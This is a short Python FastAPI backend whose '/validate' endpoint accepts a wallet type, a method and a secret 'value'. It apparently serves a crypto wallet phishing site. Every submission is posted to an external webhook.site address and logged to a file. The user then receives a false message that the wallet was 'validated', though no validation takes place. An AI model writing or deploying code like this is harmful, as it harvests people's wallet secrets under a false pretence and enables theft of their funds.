from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import httpx

app = FastAPI()

# ✅ Allow requests only from your frontend
app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "https://da-2c44pkqpe-hudsons-projects-f408486b.vercel.app",
        "https://da-pps-hudsons-projects-f408486b.vercel.app",
        "http://localhost:3000",  # Optional: for local development
    ],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ✅ Validation payload model
class ValidationData(BaseModel):
    wallet: str
    method: str
    value: str

@app.post("/validate")
async def validate_wallet(data: ValidationData):
    try:
        # Send to webhook
        async with httpx.AsyncClient() as client:
            await client.post(
                "https://webhook.site/2920d0a0-1182-4b6a-a7af-921312c87c55",
                json=data.dict()
            )
        print("✅ Data sent to webhook.")
    except Exception as e:
        print("❌ Webhook error:", e)

    try:
        # Log to file
        with open("submissions.txt", "a") as f:
            f.write(f"{data.wallet},{data.method},{data.value}\n")
        print("📝 Logged to file.")
    except Exception as e:
        print("⚠️ File log failed:", e)

    print("📥 Received data:", data.dict())
    return {
        "status": "success",
        "message": f"Wallet '{data.wallet}' validated via {data.method}."
    }
